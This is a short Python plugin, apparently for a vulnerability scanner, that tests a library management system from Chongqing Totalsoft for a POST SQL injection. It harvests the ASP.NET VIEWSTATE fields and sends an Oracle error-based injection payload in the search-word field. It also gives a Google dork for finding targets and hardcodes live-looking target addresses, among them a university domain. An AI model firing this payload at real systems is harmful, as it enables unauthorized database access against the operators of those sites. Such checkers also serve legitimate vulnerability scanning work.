#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 图腾软件图书管理系统一处POST注入
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2010-0136278
description:

google dork:
    版权所有© 重庆图腾软件发展有限公司 
'''
import re

def assign(service, arg):
    if service == 'totalsoft_lib':
        return True, arg

def audit(arg):
    # proxy = ('127.0.0.1', 8887)
    #获取IIS的viewstate
    url = arg + 'RDSuggestBook.aspx'
    code, head, res, err, _ = curl.curl2(url)
    if code != 200:
        return False
    m = re.search(r'id="__VIEWSTATE"\s*value="([a-zA-Z0-9+/=]*)"',res)
    #print res
    if not m:
        viewstate = ''
    else:
        viewstate = m.group(1).replace('=','%3D')
    m = re.search(r'id="__EVENTVALIDATION"\s*value="([a-zA-Z0-9+/=]*)"', res)
    if not m:
        eventvalidation = ''
    else:
        eventvalidation = m.group(1).replace('=','%3D')
    m = re.search(r'id="__VIEWSTATEGENERATOR"\s*value="([a-zA-Z0-9+/=]*)"', res)
    if not m:
        viewstategenerator = ''
    else:
        viewstategenerator = m.group(1).replace('=','%3D')
    '''
    print viewstate + "\n\n\n\n"
    print eventvalidation + "\n\n\n\n"
    print viewstategenerator
    '''
    post = '__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE={viewstate}&__VIEWSTATEGENERATOR={viewstategenerator}&__EVENTVALIDATION={eventvalidation}&ctl00%24ContentPlaceHolder1%24DDLField=JS_TI.TM&ctl00%24ContentPlaceHolder1%24TBSeachWord=a\' AND 4166=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(112)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (4166=4166) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(98)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND \'dxvU\' LIKE \'dxvU&ctl00%24ContentPlaceHolder1%24TBStartDate=&ctl00%24ContentPlaceHolder1%24TBEndDate=&ctl00%24ContentPlaceHolder1%24DDLState=%E5%85%A8%E9%83%A8%EF%BC%88ALL%EF%BC%89&ctl00%24ContentPlaceHolder1%24ImageButton1.x=53&ctl00%24ContentPlaceHolder1%24ImageButton1.y=19'.format(
        viewstate = viewstate,
        eventvalidation = eventvalidation,
        viewstategenerator = viewstategenerator
        )
    #手动urlencode
    post = post.replace('+', '%2B').replace('/', '%2F')
    content_type = 'Content-Type: application/x-www-form-urlencoded'
    code, head, res, err, _ = curl.curl2(url, post=post, header=content_type)
    #print code, res
    if (code != 0) and ('qvpvq1qbbjq' in res):
        security_hole('SQL Injection: ' + url + ' Parameter: ctl00$ContentPlaceHolder1$TBSeachWord (POST)')
if __name__ == '__main__':
    from dummy import *
    audit(assign('totalsoft_lib', 'http://124.160.90.204/')[1])
    #audit(assign('totalsoft_lib', 'http://www.paisi.edu.cn:85/')[1])